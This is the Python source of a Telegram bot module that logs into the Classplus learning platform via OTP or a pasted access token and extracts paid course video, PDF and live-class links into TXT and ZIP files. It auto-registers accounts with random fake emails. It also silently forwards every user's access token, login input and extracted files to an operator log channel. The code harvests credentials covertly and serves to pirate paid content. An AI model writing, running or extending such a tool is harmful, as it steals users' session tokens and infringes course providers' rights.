import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
import concurrent.futures
import re
from config import PREMIUM_LOGS, join,BOT_TEXT
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log
import zipfile
from pathlib import Path
from aiohttp import ClientTimeout
from asyncio import Semaphore
import backoff
import logging
from typing import List, Dict, Tuple, Any
from concurrent.futures import ThreadPoolExecutor
import subprocess
import gc
from datetime import datetime, timedelta

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")


apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper() 

# Add these at the top level of the file
REQUEST_SEMAPHORE = Semaphore(5)  # Increased from 3 to 5 concurrent requests
TIMEOUT = ClientTimeout(total=15)  # Reduced timeout to 15 seconds

# Format time taken
def format_time_taken(start_time: float) -> str:
    end_time = time.time()
    time_taken = end_time - start_time
    formatted_time = str(timedelta(seconds=int(time_taken)))
    return formatted_time

# Reduce max workers to prevent memory overload
THREADPOOL = ThreadPoolExecutor(max_workers=100)
CHUNK_SIZE = 8192

thumb = os.path.join(os.path.dirname(__file__), "logo.jpg")

@backoff.on_exception(backoff.expo, 
                     (aiohttp.ClientError, asyncio.TimeoutError),
                     max_tries=3,
                     max_time=30)
async def make_api_request(session, url, headers):
    """Make API request with retry logic and rate limiting"""
    async with REQUEST_SEMAPHORE:
        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT) as resp:
                return await resp.json()
        except Exception as e:
            print(f"Error making request to {url}: {str(e)}")
            raise

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    # Step 1: Ask for details
    details = await app.ask(message.chat.id, 
        "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
        "Send **ID & Password** in this format:\n"
        "<code>ORG_CODE*Mobile</code>\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()

    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*")
            
            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
    "Accept": "application/json, text/plain, */*",
    "region": "IN",
    "accept-language": "en",
    "Content-Type": "application/json;charset=utf-8",
    "Api-Version": "51",
    "device-id": device_id
            }
            
            # Step 2: Fetch Organization Details
            org_response = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_response.get("data", {}).get("orgId")
            org_name = org_response.get("data", {}).get("orgCode")

            # Step 3: Generate OTP
            otp_payload = {
                'countryExt': '91',
                'orgCode': org_code,
                'viaSms': '1',
                'mobile': mobile,
                'orgId': org_id,
                'otpCount': 0
            }
             
            otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            print(otp_response)

            if otp_response.status_code == 200:
                otp_data = otp_response.json()
                session_id = otp_data['data']['sessionId']
                print(session_id)

                # Step 4: Ask for OTP
                user_otp = await app.ask(message.chat.id, 
                    "📱 <b>OTP Verification</b>\n\n"
                    "OTP has been sent to your mobile number.\n"
                    "Please enter the OTP to continue.", 
                    timeout=300
                )

                if user_otp.text.isdigit():
                    otp = user_otp.text.strip()
                    print(otp)

                    # Step 5: Verify OTP
                    fingerprint_id = str(uuid.uuid4()).replace('-', '')
                    verify_payload = {
                        "otp": otp,
                        "countryExt": "91",
                        "sessionId": session_id,
                        "orgId": org_id,
                        "fingerprintId": fingerprint_id,
                        "mobile": mobile
                    }
                    
                    verify_response = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
                    

                    if verify_response.status_code == 200:
                        verify_data = verify_response.json()

                        if verify_data['status'] == 'success':
                            # OTP Verified - Proceed with Login
                            token = verify_data['data']['token']
                            s.headers['x-access-token'] = token
                            await message.reply_text(
                                "✅ <b>Login Successful!</b>\n\n"
                                "🔑 <b>Your Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            await app.send_message(PREMIUM_LOGS, 
                                "✅ <b>New Login Alert</b>\n\n"
                                "🔑 <b>Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json().get("data", {}).get("courses", [])
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")


                    elif verify_response.status_code == 201:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                    
                    elif verify_response.status_code == 409:

                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json().get("data", {}).get("courses", [])
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            
                            else:
                                await message.reply("Failed to verify OTP. Please try again.")
                        else:
                            await message.reply("NO BATCH FOUND OR ENTERED OTP IS NOT CORRECT .")
                    else:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json().get("data", {}).get("courses", [])
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")
                        else:
                            await message.reply("wrong OTP ")
                else:
                    await message.reply("Failed to generate OTP. Please check your details and try again.")

        except Exception as e:
            await message.reply(f"Error: {str(e)}")

    elif len(user_input) > 20:
        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
        await app.send_message(PREMIUM_LOGS, a)
        headers = {
            'x-access-token': user_input,
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }
        response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
        if response.status_code == 200:
            courses = response.json().get("data", {}).get("courses", [])
    
            s.session_data = {
                "token": user_input,
                "courses": {course["id"]: course["name"] for course in courses}
            }

            org_name = None

            for course in courses:
                shareable_link = course["shareableLink"]
    
                if "courses.store" in shareable_link:
  
                    new_data = shareable_link.split('.')[0].split('//')[-1]
                    org_response = s.get(f"https://api.classplusapp.com/v2/orgs/{new_data}", headers=headers)
        
                    if org_response.status_code == 200:
                        org_data = org_response.json().get("data", {})
                        org_id = org_data.get("orgId")
                        org_name = org_data.get("orgName")
                else:
                    org_name = shareable_link.split('//')[1].split('.')[1]

                print(f"Org Name: {org_name}")

            await fetch_batches(app, message, org_name)
        else:
            await message.reply("Invalid token. Please try again.")
    else:
        await message.reply("Invalid input. Please send details in the correct format.")



async def fetch_batches(app, message, org_name):
    session_data = getattr(s, "session_data", {})
    
    if "courses" in session_data:
        courses = session_data["courses"]
        
        
      
        text = "📚 <b>Available Batches</b>\n\n"
        course_list = []
        for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
            text += f"{idx}. <code>{course_name}</code>\n"
            course_list.append((idx, course_id, course_name))
        
        await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
        selected_index = await app.ask(
            message.chat.id, 
            f"{text}\n"
            "Send the index number of the batch to download.", 
            timeout=180
        )
        
        if selected_index.text.isdigit():
            selected_idx = int(selected_index.text.strip())
            
            if 1 <= selected_idx <= len(course_list):
                selected_course_id = course_list[selected_idx - 1][1]
                selected_course_name = course_list[selected_idx - 1][2]
                
                await app.send_message(
                    message.chat.id,
                    "🔄 <b>Processing Course</b>\n"
                    f"└─ Current: <code>{selected_course_name}</code>"
                )
                await extract_batch(app, message, org_name, selected_course_id)
            else:
                await app.send_message(
                    message.chat.id,
                    "❌ <b>Invalid Input!</b>\n\n"
                    "Please send a valid index number from the list."
                )
        else:
            await app.send_message(
                message.chat.id,
                "❌ <b>Invalid Input!</b>\n\n"
                "Please send a valid index number."
            )
              
    else:
        await app.send_message(
            message.chat.id,
            "❌ <b>No Batches Found</b>\n\n"
            "Please check your credentials and try again."
        )


async def process_course_contents(course_id, headers, folder_id=0, folder_path="", zip_folder_path="", is_subfolder=False):
    """Fetch and process course content recursively."""
    result = []
    zip_files = []
    
    url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'

    try:
        async with aiohttp.ClientSession() as session:
            course_data = await make_api_request(session, url, headers)
            if not course_data.get("data", {}).get("courseContent"):
                return result, zip_files
            course_data = course_data["data"]["courseContent"]
        
        # Process current folder contents
        contents = [item for item in course_data if str(item['contentType']) in ("2", "3")]
        folders = [item for item in course_data if str(item['contentType']) == "1"]
        
        if folder_path and (contents or folders):
            formatted_name = f"[{{ {folder_path} }}]" if is_subfolder else f"[[ {folder_path} ]]"
            result.append(f"\n{formatted_name}\n")
            
            if contents:
                content_dict = {}
                for item in contents:
                    content_type = str(item['contentType'])
                    sub_name = item['name']
                    url = item.get("url", "")
                    if url:
                        base_name = sub_name.rsplit('.', 1)[0] if '.' in sub_name else sub_name
                        if base_name not in content_dict:
                            content_dict[base_name] = []
                        content_dict[base_name].append((sub_name, url, content_type))
                
                for base_name, items in content_dict.items():
                    for sub_name, url, _ in items:
                        result.append(f"{sub_name}: {url}\n")
                        if zip_folder_path:
                            zip_files.append((zip_folder_path, sub_name, url))
                result.append("\n")

        # Process subfolders in parallel with chunking
        chunk_size = 3  # Process 3 folders at a time
        for i in range(0, len(folders), chunk_size):
            chunk = folders[i:i + chunk_size]
            tasks = []
            for folder in chunk:
                sub_id = folder['id']
                sub_name = folder['name']
                new_folder_path = f"{sub_name}"
                new_zip_path = os.path.join(zip_folder_path, sub_name) if zip_folder_path else sub_name
                tasks.append(process_course_contents(
                    course_id, headers, sub_id, new_folder_path, new_zip_path, is_subfolder=True
                ))
            
            try:
                chunk_results = await asyncio.gather(*tasks)
                for sub_content, sub_zip_files in chunk_results:
                    if sub_content:
                        result.extend(sub_content)
                        zip_files.extend(sub_zip_files)
            except Exception as e:
                print(f"Error processing folder chunk: {str(e)}")
                continue
            
            if i + chunk_size < len(folders):
                await asyncio.sleep(0.1)  # Small delay between chunks

    except Exception as e:
        print(f"Error processing folder {folder_path}: {str(e)}")
        return result, zip_files

    return result, zip_files

async def fetch_live_videos(course_id, headers, zip_folder_path=""):
    """Fetch live videos from the API."""
    outputs = []
    zip_files = []
    
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
            j = await make_api_request(session, url, headers)
            
            if "data" in j and "list" in j["data"] and j["data"]["list"]:
                outputs.append("\n[[ LIVE CLASSES ]]\n")
                live_folder = "Live Classes"
                for video in j["data"]["list"]:
                    name = video.get("name", "Unknown Video")
                    video_url = video.get("url", "")
                    if video_url:
                        outputs.append(f"{name}: {video_url}\n")
                        if zip_folder_path:
                            zip_files.append((os.path.join(zip_folder_path, live_folder), name, video_url))
                outputs.append("\n")
    except Exception as e:
        print(f"Error fetching live videos: {str(e)}")

    return outputs, zip_files

async def create_zip_structure(zip_files, base_path):
    """Create ZIP file with folder structure and URL files."""
    zip_path = f"{base_path}.zip"
    
    # Track used filenames to avoid duplicates
    used_filenames = set()
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        processed_folders = set()
        
        # First create all folder structure
        for folder_path, _, _ in zip_files:
            if folder_path not in processed_folders:
                folder_info = zipfile.ZipInfo(f"{folder_path}/")
                zf.writestr(folder_info, "")
                processed_folders.add(folder_path)
        
        # Then create URL files in each folder
        for folder_path, filename, url in zip_files:
            # Create base file path
            base_file_path = os.path.join(folder_path, f"{filename}.txt")
            
            # If filename already exists, add a counter
            if base_file_path in used_filenames:
                counter = 1
                while True:
                    new_file_path = os.path.join(folder_path, f"{filename}_{counter}.txt")
                    if new_file_path not in used_filenames:
                        file_path = new_file_path
                        break
                    counter += 1
            else:
                file_path = base_file_path
            
            used_filenames.add(file_path)
            zf.writestr(file_path, url)
            
    return zip_path

async def write_to_file(extracted_data, batch_name):
    """Write data to a text file asynchronously."""
    invalid_chars = '\t:/+#|@*.'
    clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
    clean_name = clean_name.replace('_', ' ')
    file_path = f"{clean_name}.txt"
    
    # Add header
    header = f"COURSE: {batch_name}\n\n"
    
    with open(file_path, "w", encoding='utf-8') as file:
        file.write(header)
        file.write(''.join(extracted_data))
    return file_path, clean_name

async def download_thumbnail(session: aiohttp.ClientSession, url: str) -> str | None:
    try:
        thumb_path = f"thumb_{int(time.time())}.jpg"
        
        async with session.get(url, timeout=30) as response:
            if response.status == 200:
                with open(thumb_path, "wb") as f:
                    while True:
                        chunk = await response.content.read(CHUNK_SIZE)
                        if not chunk:
                            break
                        f.write(chunk)
                return thumb_path
            else:
                logging.warning(f"Thumbnail download failed. Status: {response.status}")
                return None
    except Exception as e:
        logging.error(f"Error downloading thumbnail: {e}")
        return None
    finally:
        gc.collect()

async def get_course_details(session: aiohttp.ClientSession, course_id: str, headers: Dict[str, str]) -> Dict:
    """Get course details with fallback"""
    try:
        # First try v2 API
        url = f"{apiurl}/v2/course/details/{course_id}"
        async with session.get(url, headers=headers) as response:
            if response.status == 200 and response.content_type == 'application/json':
                data = await response.json()
                return data.get('data', {})

        # Fallback to v1 API
        url = f"{apiurl}/course/content/get/{course_id}"
        async with session.get(url, headers=headers) as response:
            if response.status == 200 and response.content_type == 'application/json':
                data = await response.json()
                return data.get('data', {})

        # If both fail, return empty dict
        return {}
    except Exception as e:
        logging.error(f"Error getting course details: {e}")
        return {}

async def extract_batch(app, message, org_name, batch_id):
    session_data = getattr(s, "session_data", {})
    start_time = time.time()
    
    if "token" in session_data:
        batch_name = session_data["courses"][batch_id]
        headers = {
            'x-access-token': session_data["token"],
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }

        # Get course details
        async with aiohttp.ClientSession() as session:
            # Get batch details first
            batch_url = f"{apiurl}/v2/course/details/{batch_id}"
            try:
                async with session.get(batch_url, headers=headers) as response:
                    if response.status == 200:
                        batch_data = await response.json()
                        print(f"Batch Details: {json.dumps(batch_data, indent=2)}")  # Print batch details
                        course = batch_data.get('data', {})
                    else:
                        course = {}
            except Exception as e:
                print(f"Error getting batch details: {e}")
                course = {}
            
            # Try to get thumbnail
            thumbnail_url = course.get('thumbnailUrl') or course.get('imageUrl')
            custom_thumb = None
            if thumbnail_url:
                custom_thumb = await download_thumbnail(session, thumbnail_url)

            # Extract content and create both TXT and ZIP files
            (extracted_data, zip_files), (live_videos, live_zip_files) = await asyncio.gather(
                process_course_contents(batch_id, headers, zip_folder_path=batch_name),
                fetch_live_videos(batch_id, headers, zip_folder_path=batch_name)
            )

            # Combine all content
            extracted_data.extend(live_videos)
            all_zip_files = zip_files + live_zip_files

            # Create text file
            file_path, clean_name = await write_to_file(extracted_data, batch_name)
            
            # Create ZIP file with folder structure
            zip_path = await create_zip_structure(all_zip_files, clean_name)

            # Count different types of content
            drm_count = sum(1 for _, _, url in all_zip_files if url and "playlist.m3u8" in url)
            non_drm_count = sum(1 for _, _, url in all_zip_files if url and ".m3u8" in url and "playlist.m3u8" not in url)
            pdf_count = sum(1 for _, _, url in all_zip_files if url and url.lower().endswith('.pdf'))
            image_count = sum(1 for _, _, url in all_zip_files if url and any(url.lower().endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif']))
            total_videos = drm_count + non_drm_count

            # Get org code from org_name
            org_code = org_name.upper() if org_name else "N/A"
            
            # Clean batch name for display
            clean_batch_name = batch_name.replace("_", " ")
            
            # Get user mention
            mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>'

            # Get price and other details
            price = course.get('finalPrice', course.get('price', 'N/A'))
            if isinstance(price, (int, float)):
                price = f"₹{price:,}"
            
            created_at = course.get('createdAt', '').split('T')[0] if course.get('createdAt') else 'N/A'
            expires_at = course.get('expiresAt', 'N/A')
            instructor = course.get('instructorName', 'N/A')
            total_lectures = course.get('totalLectures', 'N/A')
            
            # Fix duration calculation
            total_duration = course.get('totalDuration')
            duration_str = 'N/A'
            if total_duration:
                try:
                    # Convert to int if it's a string
                    total_duration = int(total_duration)
                    hours = total_duration // 3600
                    minutes = (total_duration % 3600) // 60
                    duration_str = f"{hours}h {minutes}m"
                except (ValueError, TypeError):
                    duration_str = str(total_duration)

            # Create captions for both TXT and ZIP files
            txt_caption = (
                f"🎯 <b>{org_name.upper()}</b>\n\n"
                f"🔑 ᴄᴏᴅᴇ: `{org_code}`\n"
                f"<blockquote>📝 ʙᴀᴛᴄʜ: {clean_batch_name}</blockquote>\n\n"
                f"💰 ᴘʀɪᴄᴇ: {price}\n"
                f"👨‍🏫 ɪɴsᴛʀᴜᴄᴛᴏʀ: {instructor}\n"
                f"📅 sᴛᴀʀᴛ: {created_at}\n"
                f"📅 ᴇxᴘɪʀʏ: {expires_at}\n"
                f"📊 ʟᴇᴄᴛᴜʀᴇs: {total_lectures}\n"
                f"⏱ ᴅᴜʀᴀᴛɪᴏɴ: {duration_str}\n\n"
                f"<blockquote>📊 ᴄᴏɴᴛᴇɴᴛ ᴅᴇᴛᴀɪʟs:\n"
                f"├─⭓ 🔐 ᴅʀᴍ: {drm_count}\n"
                f"├─⭓ 🎥 ɴᴏɴ-ᴅʀᴍ: {non_drm_count}\n"
                f"├─⭓ 📑 ᴘᴅꜰs: {pdf_count}\n"
                f"└─⭓ 🖼 ɪᴍᴀɢᴇs: {image_count}</blockquote>\n\n"
                f"🤖 ᴜsɪɴɢ: {join}\n"
                f"⏱ ᴛɪᴍᴇ ᴛᴀᴋᴇɴ: {format_time_taken(start_time)}\n"
                f"📅 ᴅᴀᴛᴇ: {time_new}\n\n"
                f"<blockquote><b>👑 EXTRACTED BY:</b> {mention}</blockquote>"
            )

            zip_caption = (
                f"🎯 <b>{org_name.upper()}</b>\n\n"
                f"🔑 ᴄᴏᴅᴇ: `{org_code}`\n"
                f"<blockquote>📝 ʙᴀᴛᴄʜ: {clean_batch_name}</blockquote>\n\n"
                f"<blockquote>📦 ᴢɪᴘ ᴄᴏɴᴛᴇɴᴛs:\n"
                f"├─⭓ 📂 ᴛᴏᴛᴀʟ ꜰᴏʟᴅᴇʀs: {len(set(f[0] for f in all_zip_files))}\n"
                f"├─⭓ 📹 ᴛᴏᴛᴀʟ ᴠɪᴅᴇᴏs: {total_videos}\n"
                f"├─⭓ 📑 ᴛᴏᴛᴀʟ ᴘᴅꜰs: {pdf_count}\n"
                f"└─⭓ 🖼 ᴛᴏᴛᴀʟ ɪᴍᴀɢᴇs: {image_count}</blockquote>\n\n"
                f"🤖 ᴜsɪɴɢ: {join}\n"
                f"⏱ ᴛɪᴍᴇ ᴛᴀᴋᴇɴ: {format_time_taken(start_time)}\n"
                f"📅 ᴅᴀᴛᴇ: {time_new}\n\n"
                f"<blockquote><b>👑 EXTRACTED BY:</b> {mention}</blockquote>"
            )

            # Send both files
            await app.send_document(
                message.chat.id, 
                file_path,
                caption=txt_caption,
                file_name=f"{clean_batch_name}.txt",
                thumb=custom_thumb or thumb
            )
            await app.send_document(
                message.chat.id, 
                zip_path,
                caption=zip_caption,
                file_name=f"{clean_batch_name}.zip",
                thumb=custom_thumb or thumb
            )
            
            # Send to logs
            await app.send_document(PREMIUM_LOGS, file_path, caption=txt_caption, thumb=custom_thumb or thumb)
            await app.send_document(PREMIUM_LOGS, zip_path, caption=zip_caption, thumb=custom_thumb or thumb)

            # Cleanup
            os.remove(file_path)
            os.remove(zip_path)
            if custom_thumb:
                os.remove(custom_thumb)


    
